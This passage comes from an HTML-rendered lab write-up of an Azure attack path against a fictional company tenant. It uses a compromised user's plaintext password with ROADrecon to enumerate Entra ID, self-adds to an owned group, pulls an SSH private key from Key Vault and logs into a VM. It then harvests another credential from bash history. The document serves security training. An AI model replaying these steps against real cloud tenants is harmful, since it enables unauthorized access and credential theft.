+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">AuthorizationFailed</span><span class="p">)</span> <span class="n">The</span> <span class="n">client</span> <span class="s1">&#39;matteus@megabigtech.com&#39;</span> <span class="n">with</span> <span class="n">object</span> <span class="n">id</span> <span class="s1">&#39;0dd32296-20f5-447c-b879-c57922db1ff0&#39;</span> <span class="n">does</span> <span class="n">not</span> <span class="n">have</span> <span class="n">authorization</span> <span class="n">to</span> <span class="n">perform</span> <span class="n">action</span> <span class="s1">&#39;Microsoft.Network/networkInterfaces/read&#39;</span> <span class="n">over</span> <span class="n">scope</span> <span class="s1">&#39;/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Network/networkInterfaces/automat01641_z1&#39;</span> <span class="n">or</span> <span class="n">the</span> <span class="n">scope</span> <span class="n">is</span> <span class="n">invalid</span><span class="p">.</span> <span class="k">If</span> <span class="n">access</span> <span class="n">was</span> <span class="n">recently</span> <span class="n">granted</span><span class="p">,</span> <span class="n">please</span> <span class="n">refresh</span> <span class="n">your</span> <span class="n">credentials</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">Code</span><span class="err">:</span> <span class="n">AuthorizationFailed</span>
+</span></span><span class="line"><span class="cl"><span class="n">Message</span><span class="err">:</span> <span class="n">The</span> <span class="n">client</span> <span class="s1">&#39;matteus@megabigtech.com&#39;</span> <span class="n">with</span> <span class="n">object</span> <span class="n">id</span> <span class="s1">&#39;0dd32296-20f5-447c-b879-c57922db1ff0&#39;</span> <span class="n">does</span> <span class="n">not</span> <span class="n">have</span> <span class="n">authorization</span> <span class="n">to</span> <span class="n">perform</span> <span class="n">action</span> <span class="s1">&#39;Microsoft.Network/networkInterfaces/read&#39;</span> <span class="n">over</span> <span class="n">scope</span> <span class="s1">&#39;/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-5/providers/Microsoft.Network/networkInterfaces/automat01641_z1&#39;</span> <span class="n">or</span> <span class="n">the</span> <span class="n">scope</span> <span class="n">is</span> <span class="n">invalid</span><span class="p">.</span> <span class="k">If</span> <span class="n">access</span> <span class="n">was</span> <span class="n">recently</span> <span class="n">granted</span><span class="p">,</span> <span class="n">please</span> <span class="n">refresh</span> <span class="n">your</span> <span class="n">credentials</span><span class="p">.</span>
+</span></span></code></pre></div><h2 id="roadrecon-for-structured-enumeration"><strong>ROADrecon For Structured Enumeration</strong><a hidden class="anchor" aria-hidden="true" href="#roadrecon-for-structured-enumeration">#</a></h2>
+<p>To better get familiar with this environment we can use the <code>ROADrecon</code> tool from the <em>(<strong>R</strong>ogue <strong>O</strong>ffice 365 and <strong>A</strong>zure (active) <strong>D</strong>irectory tools)</em> framework to interact better with Entra-ID</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ pip install roadrecon
+</span></span></code></pre></div><p>Then authenticate to the utility to acquire tokens for our owned user.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ roadrecon auth -u matteus@megabigtech.com -p SUMMERDAZE1!
+</span></span><span class="line"><span class="cl">Tokens were written to .roadtools_auth
+</span></span></code></pre></div><p>Then execute the below command to collect all Azure information that the user has permission to see.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ roadrecon gather
+</span></span><span class="line"><span class="cl">Starting data gathering phase <span class="m">1</span> of <span class="m">2</span> <span class="o">(</span>collecting objects<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Starting data gathering phase <span class="m">2</span> of <span class="m">2</span> <span class="o">(</span>collecting properties and relationships<span class="o">)</span>
+</span></span><span class="line"><span class="cl">ROADrecon gather executed in 107.38 seconds and issued <span class="m">1843</span> HTTP requests.
+</span></span></code></pre></div><p>Finally start the <code>ROADrecon</code> GUI web server with  so we can visually examine the Azure environment.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ roadrecon gui
+</span></span><span class="line"><span class="cl"> * Serving Flask app <span class="s1">&#39;roadtools.roadrecon.server&#39;</span>
+</span></span><span class="line"><span class="cl"> * Debug mode: off
+</span></span><span class="line"><span class="cl">WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+</span></span><span class="line"><span class="cl"> * Running on http://127.0.0.1:5000
+</span></span><span class="line"><span class="cl">Press CTRL+C to quit
+</span></span></code></pre></div><p><img loading="lazy" src="https://i.imgur.com/YHBli9z.png"></p>
+<p>If <code>Bloodhound</code>is available we can also transfer the collected data to the corresponding <code>Neo4j</code> instance.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ roadrecon plugin bloodhound --neodatabase localhost -du neo4j -dp neo4j1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Connecting to neo4j
+</span></span><span class="line"><span class="cl">Running queries
+</span></span><span class="line"><span class="cl">Done!
+</span></span></code></pre></div><p>Navigating to the <strong>Users</strong> tab and searching for our present user <code>Matt...</code>, We can view the overview of this user. As shown below we have the <code>ObjectID</code> and <code>Role Memeberships</code> they have been assigned to.</p>
+<p><img loading="lazy" src="https://i.imgur.com/R6j4fBu.png"></p>
+<p>Checking the <code>Owned objects</code> tab we see that our current user is the owner of the <code>DEVICE-ADMINS</code> group! This group allows desktop support to access resources and could help us in our goal to move laterally and vertically within the environment.</p>
+<p><img loading="lazy" src="https://i.imgur.com/MGjOwm9.png"></p>
+<p>Clicking the <code>Raw</code> tab we see the <code>ObjectID</code> of the group is shown as <code>aff1bca2-0c41-44e9-8e2c-8d6ca50fec45</code> .</p>
+<p><img loading="lazy" src="https://i.imgur.com/jGrQswq.png"></p>
+<p>Return to the <code>Owned objects</code> tab and click on this group, we can see the group overview below.</p>
+<p><img loading="lazy" src="https://i.imgur.com/XPF5yCb.png"></p>
+<p>Currently there are no members, but we can add ourselves to this group using the PowerShell Az module, since we are the owner.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Connect-AzAccount</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">Add-AzADGroupMember</span> <span class="n">-TargetGroupObjectId</span> <span class="n">aff1bca2</span><span class="p">-</span><span class="n">0c41</span><span class="p">-</span><span class="mf">44e9</span><span class="p">-</span><span class="n">8e2c</span><span class="p">-</span><span class="n">8d6ca50fec45</span> <span class="n">-MemberObjectId</span> <span class="n">0dd32296</span><span class="p">-</span><span class="n">20f5</span><span class="p">-</span><span class="n">447c-b879-c57922db1ff0</span>
+</span></span></code></pre></div><p>After running this command we will need to refresh our session in order for any permissions associated with this group to take effect.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Disconnect-AzAccount</span>
+</span></span><span class="line"><span class="cl"><span class="n">az</span> <span class="n">logout</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Connect-AzAccount</span>
+</span></span><span class="line"><span class="cl"><span class="n">az</span> <span class="n">login</span>
+</span></span></code></pre></div><p>Then running the below command we can check out the updated Azure role assignments.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="nb">Get-AzRoleAssignment</span>
+</span></span></code></pre></div><p><img loading="lazy" src="https://i.imgur.com/trjOpTo.jpeg"></p>
+<p><img loading="lazy" src="https://i.imgur.com/88JdVqL.jpeg"></p>
+<p>The most important output as shown in the above screenshots are the :</p>
+<ul>
+<li><code>Scope</code> : This shows which resources the user has permissions over.</li>
+<li><code>DisplayName</code> : shows the user or group assigned the role. (Remember we already belong to the <code>DEVICE-ADMINS</code> so we have permissions this group has too)</li>
+<li><code>RoleDefinitionName</code> : shows the specific role (and associated permissions) assigned.</li>
+</ul>
+<p><em><strong>So in summary the ;</strong></em></p>
+<p><strong>Matteus Lundgren</strong> has been assigned the <strong>Reader role</strong>, limited to the virtual machine <strong>AUTOMAT01</strong> within the <strong>mbt-rg-5</strong> resource group, allowing him read-only access to that VM.</p>
+<p>For the <strong>DEVICE-ADMINS Group</strong>:</p>
+<ul>
+<li>They have access to resources in <strong>mbt-rg-5</strong>, including:
+<ul>
+<li><strong>Key Vault (Devices-new)</strong>: The group can manage sensitive data like passwords or encryption keys stored in this Key Vault.</li>
+<li><strong>Network Interface and Public IP for AUTOMAT01</strong>: The group can view network-related details for this VM.</li>
+</ul>
+</li>
+</ul>
+<p>This setup controls what resources each entity can interact with in a specific resource group.</p>
+<h2 id="initial-access-to-the-automat01-vm"><strong>Initial Access to the AUTOMAT01 VM</strong><a hidden class="anchor" aria-hidden="true" href="#initial-access-to-the-automat01-vm">#</a></h2>
+<p>We can go ahead and enumerate the Key Vault! and as shown below a secret resource named <code>AUTOMAT01</code> is discovered which is stored in ASCII format.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="n">az</span> <span class="n">keyvault</span> <span class="n">secret</span> <span class="n">list</span> <span class="p">-</span><span class="n">-vault-name</span> <span class="nb">Devices-new</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;attributes&#34;</span><span class="err">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;created&#34;</span><span class="err">:</span> <span class="s2">&#34;2023-12-01T22:26:11+00:00&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;enabled&#34;</span><span class="err">:</span> <span class="n">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;expires&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;notBefore&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;recoverableDays&#34;</span><span class="err">:</span> <span class="mf">90</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;recoveryLevel&#34;</span><span class="err">:</span> <span class="s2">&#34;Recoverable+Purgeable&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;updated&#34;</span><span class="err">:</span> <span class="s2">&#34;2023-12-01T22:26:11+00:00&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;contentType&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;id&#34;</span><span class="err">:</span> <span class="s2">&#34;https://devices-new.vault.azure.net/secrets/AUTOMAT01&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;managed&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;name&#34;</span><span class="err">:</span> <span class="s2">&#34;AUTOMAT01&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;tags&#34;</span><span class="err">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;file-encoding&#34;</span><span class="err">:</span> <span class="s2">&#34;ascii&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span></code></pre></div><p>We can then use the <code>az keyvault secret show</code> command to read the secret in this resource and as shown below we have an SSH key.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="n">az</span> <span class="n">keyvault</span> <span class="n">secret</span> <span class="n">show</span> <span class="p">-</span><span class="n">-vault-name</span> <span class="nb">Devices-new</span> <span class="p">-</span><span class="n">-name</span> <span class="n">AUTOMAT01</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;attributes&#34;</span><span class="err">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;created&#34;</span><span class="err">:</span> <span class="s2">&#34;2023-12-01T22:26:11+00:00&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;enabled&#34;</span><span class="err">:</span> <span class="n">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;expires&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;notBefore&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;recoverableDays&#34;</span><span class="err">:</span> <span class="mf">90</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;recoveryLevel&#34;</span><span class="err">:</span> <span class="s2">&#34;Recoverable+Purgeable&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;updated&#34;</span><span class="err">:</span> <span class="s2">&#34;2023-12-01T22:26:11+00:00&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">},</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;contentType&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;id&#34;</span><span class="err">:</span> <span class="s2">&#34;https://devices-new.vault.azure.net/secrets/AUTOMAT01/80776fe595c64551a061e38de06eedab&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;kid&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;managed&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;name&#34;</span><span class="err">:</span> <span class="s2">&#34;AUTOMAT01&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;tags&#34;</span><span class="err">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;file-encoding&#34;</span><span class="err">:</span> <span class="s2">&#34;ascii&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">},</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;value&#34;</span><span class="err">:</span> <span class="s2">&#34;-----BEGIN RSA PRIVATE KEY-----\nMIIG4gIBAAKCAYEAupkdmQNcS8OMTjWvoUGKFRnJijGbVVPllUI0RHw4B7A2UiIw\n671wDzkHvX2pcbN1o9eBIzsz8grZ6t7Xha6lGlI4haIWmU3VOZiopFRYS8hvIR70\n6dUBCPWwWDlUotp96VFCqtelYGcKTyFibHHUSXBYjdN5oQtXJWcLuE/6e5RRTZRl\nt90sTTe72lwNOZV9pWhd1BkwY1OX80SeM8wtTZ+ThFMCMkSrBhOrsv62cYa+aq4x--SNIP--\n-----END RSA PRIVATE KEY-----\n&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>It is also possible to download this SSH secret key on our machine without removing the <code>\n</code> terminator.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="n">az</span> <span class="n">keyvault</span> <span class="n">secret</span> <span class="n">download</span> <span class="p">-</span><span class="n">-vault-name</span> <span class="nb">Devices-new</span> <span class="p">-</span><span class="n">-name</span> <span class="n">AUTOMAT01</span> <span class="p">-</span><span class="o">-file</span> <span class="n">AUTOMAT01</span><span class="p">.</span><span class="py">pem</span>
+</span></span></code></pre></div><p>Since we have permission over the virtual machine <code>AUTOMAT01</code> in the resource group <code>mbt-rg-5</code>, as shown when enumerating the role assignments in the below screenshot previously, we can go ahead and get the IP address of this VM.</p>
+<p><img loading="lazy" src="https://i.imgur.com/plDs7J7.png"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="n">az</span> <span class="n">vm</span> <span class="n">show</span> <span class="n">-d</span> <span class="n">-g</span> <span class="nb">mbt-rg</span><span class="p">-</span><span class="mf">5</span> <span class="n">-n</span> <span class="n">AUTOMAT01</span> <span class="p">-</span><span class="n">-query</span> <span class="n">publicIps</span> <span class="n">-o</span> <span class="n">tsv</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mf">13.68</span><span class="p">.</span><span class="py">147</span><span class="p">.</span><span class="py">240</span>
+</span></span></code></pre></div><p>Then we can grant <code>rw</code> permissions to the SSH private key and connect via SSH. If you are wondering how we got the username then refer to the top of this write-up during the enumeration of the VM phase</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="n">chmod</span> <span class="mf">600</span> <span class="p">./</span><span class="n">AUTOMAT01</span><span class="p">.</span><span class="py">pem</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="n">ssh</span> <span class="n">-i</span> <span class="n">AUTOMAT01</span><span class="p">.</span><span class="py">pem</span> <span class="n">automation</span><span class="nv">@13</span><span class="p">.</span><span class="py">68</span><span class="p">.</span><span class="py">147</span><span class="p">.</span><span class="py">240</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">The</span> <span class="n">authenticity</span> <span class="n">of</span> <span class="n">host</span> <span class="s1">&#39;13.68.147.240 (13.68.147.240)&#39;</span> <span class="n">can</span><span class="s1">&#39;t be established.
+</span></span></span><span class="line"><span class="cl"><span class="s1">ED25519 key fingerprint is SHA256:6GhdVGDYwkrfNkqprJC3ybwWOrbNuHwE7OxvJVvpWFo.
+</span></span></span><span class="line"><span class="cl"><span class="s1">This key is not known by any other names.
+</span></span></span><span class="line"><span class="cl"><span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span class="line"><span class="cl"><span class="s1">Warning: Permanently added &#39;</span><span class="mf">13.68</span><span class="p">.</span><span class="py">147</span><span class="p">.</span><span class="mf">240</span><span class="err">&#39;</span> <span class="p">(</span><span class="n">ED25519</span><span class="p">)</span> <span class="n">to</span> <span class="n">the</span> <span class="n">list</span> <span class="n">of</span> <span class="n">known</span> <span class="n">hosts</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">Welcome</span> <span class="n">to</span> <span class="n">Ubuntu</span> <span class="mf">20.04</span><span class="p">.</span><span class="py">6</span> <span class="n">LTS</span> <span class="p">(</span><span class="n">GNU</span><span class="p">/</span><span class="n">Linux</span> <span class="mf">5.15</span><span class="p">.</span><span class="mf">0</span><span class="p">-</span><span class="mf">1052</span><span class="n">-azure</span> <span class="n">x86_64</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="p">*</span> <span class="n">Documentation</span><span class="err">:</span>  <span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="n">help</span><span class="p">.</span><span class="py">ubuntu</span><span class="p">.</span><span class="py">com</span>
+</span></span><span class="line"><span class="cl"> <span class="p">*</span> <span class="n">Management</span><span class="err">:</span>     <span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="n">landscape</span><span class="p">.</span><span class="py">canonical</span><span class="p">.</span><span class="py">com</span>
+</span></span><span class="line"><span class="cl"> <span class="p">*</span> <span class="n">Support</span><span class="err">:</span>        <span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="n">ubuntu</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">advantage</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">System</span> <span class="n">information</span> <span class="n">as</span> <span class="n">of</span> <span class="n">Wed</span> <span class="n">Oct</span> <span class="mf">16</span> <span class="mf">09</span><span class="err">:</span><span class="mf">09</span><span class="err">:</span><span class="mf">14</span> <span class="n">UTC</span> <span class="mf">2024</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">System</span> <span class="n">load</span><span class="err">:</span>  <span class="mf">0.0</span>                <span class="n">Processes</span><span class="err">:</span>             <span class="mf">103</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Usage</span> <span class="n">of</span> <span class="p">/</span><span class="err">:</span>   <span class="mf">12.1</span><span class="p">%</span> <span class="n">of</span> <span class="mf">28.89</span><span class="p">GB</span>   <span class="n">Users</span> <span class="n">logged</span> <span class="k">in</span><span class="err">:</span>       <span class="mf">0</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Memory</span> <span class="n">usage</span><span class="err">:</span> <span class="mf">18</span><span class="p">%</span>                <span class="n">IPv4</span> <span class="n">address</span> <span class="k">for</span> <span class="n">eth0</span><span class="err">:</span> <span class="mf">10.1</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="py">4</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Swap</span> <span class="n">usage</span><span class="err">:</span>   <span class="mf">0</span><span class="p">%</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">-</span><span class="n">-SNIP</span><span class="p">--</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">automation</span><span class="nv">@AUTOMAT01</span><span class="err">:</span><span class="p">~$</span> <span class="n">whoami</span>
+</span></span><span class="line"><span class="cl"><span class="n">automation</span>
+</span></span><span class="line"><span class="cl"><span class="n">automation</span><span class="nv">@AUTOMAT01</span><span class="err">:</span><span class="p">~$</span> <span class="n">hostnamectl</span>
+</span></span><span class="line"><span class="cl">   <span class="n">Static</span> <span class="n">hostname</span><span class="err">:</span> <span class="n">AUTOMAT01</span>
+</span></span><span class="line"><span class="cl">         <span class="n">Icon</span> <span class="n">name</span><span class="err">:</span> <span class="nb">computer-vm</span>
+</span></span><span class="line"><span class="cl">           <span class="n">Chassis</span><span class="err">:</span> <span class="n">vm</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Machine</span> <span class="n">ID</span><span class="err">:</span> <span class="n">5ce911bbc50f4dc7876fbed23e106dd8</span>
+</span></span><span class="line"><span class="cl">           <span class="n">Boot</span> <span class="n">ID</span><span class="err">:</span> <span class="n">4ed5ef75483e407999f463f8d4a7f9eb</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Virtualization</span><span class="err">:</span> <span class="n">microsoft</span>
+</span></span><span class="line"><span class="cl">  <span class="n">Operating</span> <span class="n">System</span><span class="err">:</span> <span class="n">Ubuntu</span> <span class="mf">20.04</span><span class="p">.</span><span class="py">6</span> <span class="n">LTS</span>
+</span></span><span class="line"><span class="cl">            <span class="n">Kernel</span><span class="err">:</span> <span class="n">Linux</span> <span class="mf">5.15</span><span class="p">.</span><span class="mf">0</span><span class="p">-</span><span class="mf">1052</span><span class="n">-azure</span>
+</span></span><span class="line"><span class="cl">      <span class="n">Architecture</span><span class="err">:</span> <span class="n">x86</span><span class="p">-</span><span class="n">64s</span>
+</span></span></code></pre></div><h2 id="post-exploitation"><strong>Post Exploitation</strong><a hidden class="anchor" aria-hidden="true" href="#post-exploitation">#</a></h2>
+<p>It is worth doing some laying off the land enumeration, finding sensitive files/ hardcoded credentials; And as shown below we have another user credential in the  <code>.bash_history</code> file of the user <code>automation</code> home directory.</p>
+<pre tabindex="0"><code>az login -u &#34;serene@megabigtech.com&#34; -p &#34;xxxxxxxxxxx&#34;
+</code></pre><p><img loading="lazy" src="https://i.imgur.com/uaCm5r1.png"></p>
+<h2 id="accessing-automation-account-and-exporting-runbook-in-azure"><strong>Accessing Automation Account and Exporting Runbook in Azure</strong><a hidden class="anchor" aria-hidden="true" href="#accessing-automation-account-and-exporting-runbook-in-azure">#</a></h2>
+<p>We can therefore go ahead back to our powershell session and connect to the new Azure account we just got!</p>
+<pre tabindex="0"><code>Disconnect-AzAccount
+az logout
+Connect-AzAccount
+az login
+</code></pre><p>Then Access to an <strong>Automation Account</strong> named <code>automation-dev</code> and a <strong>Runbook</strong> named <code>Schedule-VMStartStop</code> was enumerated using <code>Get-AzResource</code>. or the <code>az resource list</code> command as used previously.</p>
+<p><img loading="lazy" src="https://i.imgur.com/sOUPJOC.png"></p>
+<blockquote>
+<p><strong>Azure Automation Accounts</strong> enable task automation using PowerShell or Python scripts for managing enterprise resources and workloads, streamlining deployment, operations, and decommissioning processes.</p>
+<p><strong>Runbooks</strong> are scripts within Automation Accounts that automate tasks, ensuring consistent management of resources at scale and minimizing manual intervention.</p>
+</blockquote>
+<p>We can use the <code>Get-AzAutomationAccount</code> cmdlet to retrieve key details about the Automation Account, confirming whether public access is enabled or not.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="nb">Get-AzAutomationAccount</span> <span class="n">-ResourceGroupName</span> <span class="s2">&#34;mbt-rg-5&#34;</span> <span class="n">-Name</span> <span class="s2">&#34;automation-dev&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">SubscriptionId</span>        <span class="err">:</span> <span class="nb">ceff06cb-e29d</span><span class="p">-</span><span class="mf">4486</span><span class="n">-a3ae-eaaec5689f94</span>
+</span></span><span class="line"><span class="cl"><span class="n">ResourceGroupName</span>     <span class="err">:</span> <span class="nb">mbt-rg</span><span class="p">-</span><span class="mf">5</span>
+</span></span><span class="line"><span class="cl"><span class="n">AutomationAccountName</span> <span class="err">:</span> <span class="nb">automation-dev</span>
+</span></span><span class="line"><span class="cl"><span class="n">Location</span>              <span class="err">:</span> <span class="n">eastus</span>
+</span></span><span class="line"><span class="cl"><span class="n">State</span>                 <span class="err">:</span> <span class="n">Ok</span>
+</span></span><span class="line"><span class="cl"><span class="n">Plan</span>                  <span class="err">:</span> <span class="n">Basic</span>
+</span></span><span class="line"><span class="cl"><span class="n">CreationTime</span>          <span class="err">:</span> <span class="mf">12</span><span class="p">/</span><span class="mf">1</span><span class="p">/</span><span class="mf">2023</span> <span class="mf">2</span><span class="err">:</span><span class="mf">21</span><span class="err">:</span><span class="n">55PM</span> <span class="mf">+01</span><span class="err">:</span><span class="mf">00</span>
+</span></span><span class="line"><span class="cl"><span class="n">LastModifiedTime</span>      <span class="err">:</span> <span class="mf">12</span><span class="p">/</span><span class="mf">1</span><span class="p">/</span><span class="mf">2023</span> <span class="mf">2</span><span class="err">:</span><span class="mf">21</span><span class="err">:</span><span class="n">55PM</span> <span class="mf">+01</span><span class="err">:</span><span class="mf">00</span>
+</span></span><span class="line"><span class="cl"><span class="n">LastModifiedBy</span>        <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">Tags</span>                  <span class="err">:</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="n">Identity</span>              <span class="err">:</span> 
